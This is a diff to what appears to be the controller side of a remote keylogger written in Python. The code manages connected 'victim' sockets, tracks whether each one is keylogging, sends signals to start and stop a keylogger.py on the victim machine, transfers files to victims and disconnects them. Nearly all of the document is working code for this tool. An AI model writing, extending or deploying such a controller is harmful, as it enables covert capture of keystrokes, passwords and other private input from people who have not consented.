@@ -194,27 +194,32 @@ def disconnect_from_client(sockets_list: list, connected_clients: dict):
         try:
             target_ip = str(ipaddress.ip_address(input(constants.ENTER_TARGET_IP_DISCONNECT_PROMPT)))
             target_port = int(input(constants.ENTER_TARGET_PORT_DISCONNECT_PROMPT))
-            keylog_status = False
 
             # CHECK: if client is present in connected_clients list
-            if (target_ip, target_port, keylog_status) in connected_clients.values():
-                print(constants.DISCONNECT_FROM_VICTIM_MSG.format((target_ip, target_port)))
+            for client_sock, client_info in connected_clients.items():
+                if client_info[:2] == (target_ip, target_port):
+                    target_socket = client_sock
 
-                for client_sock, (ip, port, _) in connected_clients.items():
-                    if ip == target_ip and port == target_port:
-                        target_socket = client_sock
+                    # Check if target socket is currently running keylogger
+                    if client_info[2]:
+                        print(constants.DISCONNECT_ERROR_KEYLOG_TRUE.format(target_ip, target_port))
+                        print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
+                        print(constants.RETURN_MAIN_MENU_MSG)
+                        print(constants.MENU_CLOSING_BANNER)
+                        return None
 
-                        # Remove client from both socket and connected_clients list
-                        sockets_list.remove(target_socket)
-                        del connected_clients[target_socket]
+                    # Remove client from both socket and connected_clients list
+                    print(constants.DISCONNECT_FROM_VICTIM_MSG.format((target_ip, target_port)))
+                    sockets_list.remove(target_socket)
+                    del connected_clients[target_socket]
 
-                        # Close socket
-                        target_socket.close()
+                    # Close socket
+                    target_socket.close()
 
-                        print(constants.DISCONNECT_FROM_VICTIM_SUCCESS)
-                        break
-            else:
-                print(constants.DISCONNECT_FROM_VICTIM_ERROR)
+                    print(constants.DISCONNECT_FROM_VICTIM_SUCCESS)
+                    break
+                else:
+                    print(constants.DISCONNECT_FROM_VICTIM_ERROR)
         except ValueError as e:
             print(constants.INVALID_INPUT_ERROR.format(e))
 
@@ -262,25 +267,27 @@ def find_specific_client_socket(client_dict: dict,
     try:
         # Initialize Variables
         target_socket = None
+        status = False
 
         # Check target_ip and target_port
         ipaddress.ip_address(target_ip)
 
         # Find a specific client socket from client socket list to send data to
-        for client_sock, (ip, port, _) in client_dict.items():
-            if ip == target_ip and port == target_port:
+        for client_sock, client_info in client_dict.items():
+            if client_info[:2] == (target_ip, target_port):
                 target_socket = client_sock
+                status = client_info[2]
                 break
 
         # Check if target_socket is not None and return
         if target_socket:
-            return target_socket, target_ip, target_port
+            return target_socket, target_ip, target_port, status
         else:
-            return None, None, None
+            return None, None, None, None
 
     except ValueError as e:
         print(constants.INVALID_INPUT_ERROR.format(e))
-        return None, None, None
+        return None, None, None, None
 
 
 def perform_menu_item_3(client_dict: dict):
@@ -290,15 +297,33 @@ def perform_menu_item_3(client_dict: dict):
 
     # Handle single client in client list
     if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
-        client_socket, (client_ip, client_port, _) = next(iter(client_dict.items()))
+        client_socket, (client_ip, client_port, status) = next(iter(client_dict.items()))
+
+        # Check if target socket is currently running keylogger
+        if status:
+            print(constants.DISCONNECT_ERROR_KEYLOG_TRUE.format(client_ip, client_port))
+            print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+            return None
+
         transfer_file(client_socket, client_ip, client_port)
 
     # Send keylogger to any specific connected victim
     elif len(client_dict) != constants.ZERO:
         target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
         target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
-        target_socket, target_ip, target_port = find_specific_client_socket(client_dict,
-                                                                            target_ip, target_port)
+        target_socket, target_ip, target_port, status = find_specific_client_socket(client_dict,
+                                                                                    target_ip, target_port)
+
+        # Check if target socket is currently running keylogger
+        if status:
+            print(constants.FILE_TRANSFER_KEYLOG_TRUE_ERROR.format(target_ip, target_port))
+            print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+            return None
+
         if target_socket:
             transfer_file(target_socket, target_ip, target_port)
         else:
@@ -306,3 +331,168 @@ def perform_menu_item_3(client_dict: dict):
 
     print(constants.RETURN_MAIN_MENU_MSG)
     print(constants.MENU_CLOSING_BANNER)
+
+
+def perform_menu_item_1(client_dict: dict):
+    print(constants.START_KEYLOG_INITIAL_MSG)
+
+    # a) CASE: Check if client list is empty
+    if len(client_dict) == constants.ZERO:
+        print(constants.CLIENT_LIST_EMPTY_ERROR)
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+
+    # b) CASE: Handle single client in client list
+    if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
+        # Get client socket
+        client_socket, (ip, port, is_keylogging) = next(iter(client_dict.items()))
+
+        if is_keylogging:
+            print(constants.KEYLOG_STATUS_TRUE_ERROR.format(ip, port))
+            print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
+        else:
+            __perform_menu_item_1_helper(client_socket, client_dict, ip, port)
+
+    # c) CASE: Handle any specific connected client in client list
+    elif len(client_dict) != constants.ZERO:
+        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
+        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
+        target_socket, target_ip, target_port, is_keylogging = find_specific_client_socket(client_dict,
+                                                                                           target_ip,
+                                                                                           target_port)
+        if target_socket:
+            if is_keylogging:
+                print(constants.KEYLOG_STATUS_TRUE_ERROR.format(target_ip, target_port))
+                print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
+                print(constants.RETURN_MAIN_MENU_MSG)
+                print(constants.MENU_CLOSING_BANNER)
+            else:
+                __perform_menu_item_1_helper(target_socket, client_dict, target_ip, target_port)
+        else:
+            print(constants.TARGET_VICTIM_NOT_FOUND)
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+
+
+def __perform_menu_item_1_helper(client_socket: socket.socket, client_dict: dict,
+                                 ip: str, port: int):
+    # Send signal to start keylog
+    print(constants.START_SEND_SIGNAL_MSG.format(constants.KEYLOG_FILE_NAME, ip, port))
+    client_socket.send(constants.START_KEYLOG_MSG.encode())
+
+    # Await OK signal from client
+    print(constants.AWAIT_START_RESPONSE_MSG)
+    ack = client_socket.recv(constants.BYTE_LIMIT).decode()
+
+    #  i) Check if keylogger.py is in victim's directory
+    try:
+        if ack == constants.RECEIVED_CONFIRMATION_MSG:
+            print(constants.START_SIGNAL_RECEIVED_MSG.format(constants.KEYLOG_FILE_NAME))
+            client_socket.send(constants.CHECK_KEYLOG.encode())
+
+            print(constants.START_SIGNAL_SEND_FILE_NAME.format(constants.KEYLOG_FILE_NAME))
+            client_socket.send(constants.KEYLOG_FILE_NAME.encode())
+
+            # Get status
+            print(constants.AWAIT_START_RESPONSE_MSG)
+            status = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
+            msg = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
+
+            if status == constants.STATUS_TRUE:
+                print(constants.CLIENT_RESPONSE.format(msg))
+
+                # Send signal to victim to start
+                print(constants.START_SIGNAL_EXECUTE_KEYLOG.format(constants.KEYLOG_FILE_NAME))
+                client_socket.send(constants.START_KEYLOG_MSG.encode())
+
+                # Awaiting Response
+                msg = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
+                print(constants.CLIENT_RESPONSE.format(msg))
+
+                # Replace the keylog status of the client in client dictionary to True
+                client_dict[client_socket] = (ip, port, True)
+
+                print(constants.STOP_KEYLOG_SUGGESTION_MSG.format(ip, port))
+                print(constants.RETURN_MAIN_MENU_MSG)
+                print(constants.MENU_CLOSING_BANNER)
+            else:
+                print(constants.CLIENT_RESPONSE.format(msg))
+                print(constants.MISSING_KEYLOG_FILE_SUGGEST_MSG)
+                print(constants.RETURN_MAIN_MENU_MSG)
+                print(constants.MENU_CLOSING_BANNER)
+
+    except Exception as e:
+        print(constants.KEYLOG_FILE_CHECK_ERROR.format(constants.KEYLOG_FILE_NAME, e))
+
+
+def perform_menu_item_2(client_dict: dict):
+    print(constants.STOP_KEYLOG_INITIAL_MSG)
+
+    # a) CASE: Check if client list is empty
+    if len(client_dict) == constants.ZERO:
+        print(constants.CLIENT_LIST_EMPTY_ERROR)
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+
+    # b) CASE: Handle single client in client list
+    if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
+        # Get client socket
+        client_socket, (ip, port, is_keylogging) = next(iter(client_dict.items()))
+        __perform_menu_item_2_helper(client_dict, client_socket, ip, port, is_keylogging)
+
+    # c) CASE: Handle for clients greater than 1
+    elif len(client_dict) != constants.ZERO:
+        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
+        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
+        target_socket, target_ip, target_port, is_keylogging = find_specific_client_socket(client_dict,
+                                                                                           target_ip,
+                                                                                           target_port)
+
+        if target_socket:
+            __perform_menu_item_2_helper(client_dict, target_socket,
+                                         target_ip, target_port, is_keylogging)
+        else:
+            print(constants.TARGET_VICTIM_NOT_FOUND)
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+
+
+def __perform_menu_item_2_helper(client_dict: dict, client_socket: socket.socket,
+                                 target_ip: str, target_port: int, is_keylogging: bool):
+    # Check keylog status
+    if not is_keylogging:
+        print(constants.STOP_KEYLOG_STATUS_FALSE.format(target_ip, target_port))
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+    else:
+        # Get signal from user to stop keylog on client/victim side
+        signal_to_stop = constants.ZERO
+        print(constants.STOP_KEYLOGGER_PROMPT)
+
+        while True:
+            try:
+                signal_to_stop = int(input())
+                if signal_to_stop == constants.PERFORM_MENU_ITEM_TWO:
+                    client_socket.send(constants.STOP_KEYWORD.encode())
+                    break
+                print(constants.INVALID_INPUT_STOP_KEYLOGGER)
+            except ValueError as e:
+                print(constants.INVALID_INPUT_STOP_KEYLOGGER)
+
+        # Await Results from keylogger on client/victim side (BLOCKING CALL)
+        result = client_socket.recv(constants.BYTE_LIMIT).decode().split("/")
+        result_status = result[0]
+        result_msg = result[1]
+
+        if result_status == constants.STATUS_TRUE:
+            print(constants.CLIENT_RESPONSE.format(result_msg))
+            print(constants.KEYLOG_OPERATION_SUCCESSFUL)
+
+            # Update client status
+            client_dict[client_socket] = (target_ip, target_port, False)
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+        else:
+            print(constants.STOP_KEYLOG_RESULT_ERROR.format(result_msg))
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
